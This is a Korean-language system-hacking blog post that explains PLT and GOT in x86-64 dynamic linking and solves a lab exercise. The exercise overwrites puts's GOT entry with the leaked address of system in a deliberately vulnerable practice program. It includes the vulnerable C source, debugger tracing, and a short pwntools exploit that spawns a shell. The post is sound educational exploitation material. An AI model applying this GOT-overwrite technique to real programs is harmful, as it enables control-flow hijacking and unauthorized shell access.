---
layout: post
title:  "PLT & GOT Overwrite in x86-64"
summary: PLT를 이용한 GOT 값 덮어쓰기 실습
author: TouBVa
date: '2022-12-21 11:15:23 +09'
category: ['system_hacking', 'protostar']
thumbnail: /assets/img/posts/pltgot/Untitled.jpeg
keywords: System Hacking, PLT, GOT, x86-64
usemathjax: true
permalink: /blog/system_hacking/plt-got-overwrite
---

* TOC
{:toc}

<br>

# 0. PLT&GOT란?

[이전 포스트의 섹션 3](https://toubva.github.io/blog/protostar-stack5-x86-x64/#/) 에서 다루었던 요소가 있다. 바로 GCC 를 이용한 C 언어 소스 코드 컴파일 시, 파일 실행 시의 행위였다. 가볍게 해당 과정을 되살려보자. (정적 라이브러리 방식은 현재 주제와 관련 없으므로 쓰지 않았다)

<br>

## 0.1. 컴파일 시의 행위(동적 라이브러리 참조)

1. 프로그램 컴파일 명령어를 보낸다.
2. gcc는 링커를 트리거한다.
3. 링커는 어떤 컴파일러를 쓰는지, 소스에는 어떤 라이브러리가 명시되어 있는지 체크해 필요한 라이브러리를 찾아낸다.
    - 이 때 라이브러리를 찾아내는 과정에서는 `Linker Name` 을 참고한다(.so 파일).
4. 그리고 해당 라이브러리의 `soname` 을 읽어온다(.so.2.6 등의 버전 넘버).
5. 읽어온 `soname` 을 기준으로 라이브러리들을 파일에 연결시켜 컴파일한다.

<br>

## 0.2. 파일 실행 시의 행위(동적 라이브러리 참조)

1. 파일을 실행하면 `Dynamic Loader` 가 트리거된다.
2. Dynamic Linking 된 공유 라이브러리들을 컴파일 단계에서 확보해 둔 `soname` 을 이용해 찾아 낸다.
3. 이후 찾아낸 라이브러리들을 해당 ELF 파일의 가상 메모리 섹션에 탑재한다. (리눅스의 경우 heap과 stack 사이에 라이브러리가 탑재되고 윈도우의 경우 스택의 엉덩이에 힙의 엉덩이가 맞붙어 있는.. 형태라… 애플리케이션이 탑재된 영역 아래에 커널 라이브러리 영역이 탑재된다) 

*<br>*

## 0.3. 정리

즉, 정적 라이브러리 방식으로 파일을 컴파일 및 실행하게 된다면 당연히 모든 라이브러리와 함수가 해당 소스 코드에 포함된 상태로 실행되므로 굳이 라이브러리에 명시된 함수의 주소를 알아오는 과정이 필요하지 않지만

**동적 라이브러리 링킹 방식으로 파일을 컴파일하거나 실행**할 때, 다양한 라이브러리 파일을 해당 소스 코드에 링킹하기 때문에 **해당 라이브러리는 메모리의 어느 위치에 탑재되었는지, 그 라이브러리 내에 정의된 함수들은 어느 위치에 탑재되었는지**에 관한 정보가 필수적이다.

이런 식의 정보를 쉽게 알려주기 위해 **plt와 got**를 사용하게 되었다.

위의 기능이 언제나 가능하도록 만들기 위해 **“plt의 주소는 언제나 고정되어 있다”.**

![최초로 함수의 주소를 알아올 때 plt와 got의 행위를 나타낸 도식.](/assets/img/posts/pltgot/Untitled.jpeg){: width="100%" height="100%"}

최초로 함수의 주소를 알아올 때 plt와 got의 행위를 나타낸 도식.

- **PLT(Procedure Linkage Table)**는 현재 콜하려는 라이브러리상의 함수의 주소를 **got의 어느 부분이 가리키는지** 알고 있다.
    - `jmp {rip-x(address)}` 포맷의 인스트럭션을 이용해 필요한 함수의 주소를 가지고 있는 got의 지점으로 포워딩해 준다.
- **GOT(Global Offset Table)**는 현재 콜하려는 라이브러리상의 **함수의 주소를 정확히** 알고 있다.
    - 다만, got 상에서 처음으로 함수의 주소를 알아내려 할 때 당시에는 got에 해당 함수의 주소가 없다.
        - got를 이용해 해당 함수의 주소를 알아내려고 할 때가 되어서야 Linker가 dl_resolve라는 함수를 이용해 주소를 알아와서 넣어준다.
        - 따라서 첫 번째 접근 이후부터는 got에 항상 주소가 있게 된다.

여기에서 중요한 건 **“plt의 주소는 언제나 고정되어 있다”는 점이다. 이를 악용해 ASLR 우회가 가능**하기 때문이다.

차후 다른 포스팅에서 got 변조를 이용한 ASLR 우회를 다룰 계획이다. 

<br><br>

# 1. 코드 정적 분석

먼저 주어진 문제 코드를 분석해 보자.

```c
//got_overwrite.c
//gcc -o got_overwrite -no-pie
#include<stdio.h>
#include<stdlib.h>
int main()
{
	unsigned int *puts_got=(unsigned int *)0x601018; // puts_got
	unsigned long value=0;
	printf("libc_system: %p\n",&system);
	puts("Overwrite puts_got");
	scanf("%lx",&value);
	*puts_got=value; //overwrite puts_got
	puts("/bin/sh");
	return 0;
}
```

<br>

## 1.1 plt와 got 직접 따라가 보기

`*puts_got` 의 초기화 값으로 로컬 환경에서 puts의 got 위치 주소를 직접 찾아다 넣어 줘야 한다.

puts의 got 위치를 찾는 방법은 아래와 같다.

![Untitled](/assets/img/posts/pltgot/Untitled%201.jpeg){: width="100%" height="100%"}

pwndbg를 이용해 `disas main`을 하면, main+121지점에서 puts를 콜할 때 명시적 주소를 콜하는 것을 확인할 수 있다.

이 때 0x400520에는 무엇이 있길래 그쪽으로 rip를 이동시켜 주는 걸까? 직접 알아보면 아래와 같은 결과를 볼 수 있다.

![Untitled](/assets/img/posts/pltgot/Untitled%202.jpeg){: width="100%" height="100%"}

**plt는 got의 특정 위치에 저장된 puts 함수의 주소로 rip를 포워딩**해 주는 역할을 하고 있었다. 

인스트럭션에 의한다면 `0x400526+0x200af2 = 0x601018` 에 실제 puts 함수의 주소가 저장되어 있을 것이다.

jmp 인스트럭션이 위치한 `0x400520` 이 아닌 바로 다음 인스트럭션의 주소인 `0x400526` 를 rip의 값으로 사용하는 이유는, 어떤 인스트럭션을 읽어 오기 위해 메모리에 접근하는 순간 pc, 즉 rip의 주소는 바로 다음 인스트럭션을 가리키게 되기 때문이다. 즉, 저 인스트럭션이 수행되는 순간의 rip는 저 인스트럭션 바로 다음 인스트럭션의 주소를 가리키고 있기 때문이다.

해당 주소(`0x601018`)에 저장된 값을 확인해 보았다. 

 

![Untitled](/assets/img/posts/pltgot/Untitled%203.jpeg){: width="100%" height="100%"}

got의 `0x601018` 지점에는 `0x400526`이 저장되어 있었고, `0x400526`으로 이동하면 `0x601010`으로 점프하게 되어 있다. `0x601010`은 `0x601018`과 값이 가깝기 때문에 아마 got의 일부분일 것으로 예상되어 `0x601010` 지점에 저장된 값 `0x7ffff7dea8f0` 주소의 인스트럭션을 확인해 보니 `dl_resolve` 계열의 함수임을 알 수 있었다.

<br>

즉, got 는 결과적으로 puts 함수의 주소를 알아내기 위해 `dl_resolve` 계열의 함수를 호출한다는 것을 확인할 수 있었다. 해당 함수가 정확히 어떤 매커니즘으로 puts 함수의 주소를 알아내 리턴해주는지에 관해서는 [여기 블로그](https://rond-o.tistory.com/216#f61b16a1-7700-4283-826f-d6ba19990bf7)가 정말 잘 설명해 두었으니 링크를 걸어둔다.

<br>

어찌 되었든, puts를 찾기 위해 plt가 rip를 jmp 시키는 주소가 `0x601018` 임을 알았으니 주어진 코드의 puts_got 값을 로컬 환경에 맞게 고칠 수 있게 되었다. 

<br>

## 1.2 코드 정적 분석

```c
//got_overwrite.c
//gcc -o got_overwrite -no-pie
#include<stdio.h>
#include<stdlib.h>
int main()
{
	unsigned int *puts_got=(unsigned int *)0x601018; // puts_got
	unsigned long value=0;
	printf("libc_system: %p\n",&system);
	puts("Overwrite puts_got");
	scanf("%lx",&value);
	*puts_got=value; //overwrite puts_got
	puts("/bin/sh");
	return 0;
}
```

주어진 코드는 먼저 system 함수의 주소를 leak 해주고, 입력받은 값을 puts_got 변수 안에 있는 주소에 넣어주는 역할을 하고 있다.

puts_got 자체가 got 테이블에 저장된 값을 변경하는 것이기 때문에, 우리는 마지막 줄에서 puts가 호출되는 시점에 엉뚱한 system 함수가 호출되도록 puts_got 변수에 system 함수의 주소를 넣어줘야 한다.

또한 사용자에게 값을 받는 시점에 `%lx` 포맷 스트링을 사용하기 때문에 기본으로 8 바이트 값을 받는다고 생각하고 있어 패딩 걱정은 하지 않아도 좋을 것이다.

<br><br>

# 2. 익스플로잇 설계

앞서 분석했던 점을 감안하면 익스플로잇이 해야 할 일은 다음과 같다.

- 먼저 프로그램이 출력하는 시스템 함수의 주소를 받아 저장한다.
- 저장했던 시스템 함수의 주소를 스트링 형식으로 입력한다. 애초에 포맷 스트링이 `%lx` 이므로 스트링으로 입력해 줘야 컴파일러가 알아서 hex 값으로 인식할 것이다.

<br><br>

# 3. 익스플로잇

익스플로잇 코드는 아래와 같다.

```python
from pwn import *

p = process("./got_overwrite")

p.recvuntil("0x")

libc_system = int(p.recvline(), 16)
payload = hex(libc_system&0x0000ffffffff)

# gdb.attach(p)
# raw_input("1")

p.sendline(str(payload))
p.interactive()
```

앞서 이야기한 것과 같이, plt의 주소는 고정되어 있기 때문에 ASLR을 켜도, ASLR을 꺼도 동일하게 익스플로잇에 성공할 수 있다.

익스플로잇을 실행한 결과 아래와 같이 쉘을 딸 수 있었다.

![Untitled](/assets/img/posts/pltgot/Untitled%204.jpeg){: width="100%" height="100%"}